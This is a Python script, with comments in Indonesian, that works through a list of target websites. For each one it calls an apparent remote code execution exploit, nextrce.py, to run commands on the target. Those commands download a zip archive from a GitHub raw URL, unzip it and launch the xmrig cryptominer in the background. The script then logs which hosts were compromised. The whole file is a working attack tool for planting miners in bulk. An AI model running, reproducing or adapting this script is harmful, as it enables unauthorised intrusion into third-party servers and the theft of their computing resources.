import subprocess
import time

SITELIST = "site.txt"

commands = [
    "mkdir zxx",
    "wget -O zxx/zzx.zip https://raw.githubusercontent.com/animejawa/tail/refs/heads/main/zzx.zip > wget.log 2>&1",
    "unzip zxx/zzx.zip",
    "chmod +x xmrig",
    "nohup ./xmrig --config config.json >> zzx.log 2>&1 &"
]

with open(SITELIST, "r") as f:
    sites = [line.strip() for line in f if line.strip()]

for url in sites:
    print(f"[+] Processing {url}")
    
    unzip_output = ""
    
    for cmd in commands:
        full_command = [
            "python3", "nextrce.py",
            "-u", url,
            "-c", cmd
        ]

        result = subprocess.run(
            full_command,
            capture_output=True,
            text=True
        )

        # Kalau ini command unzip, simpan outputnya
        if "unzip" in cmd:
            unzip_output = result.stdout + result.stderr

        time.sleep(10)  # Delay 10 detik setiap command

    # Cek hasil unzip
    if "inflating:" in unzip_output:
        with open("success.txt", "a") as s:
            s.write(url + "\n")
        print(f"[+] UNZIP SUCCESS: {url}")
    else:
        with open("failed.txt", "a") as f:
            f.write(url + "\n")
        print(f"[!] UNZIP FAILED: {url}")

    print(f"[+] Done {url}\n")
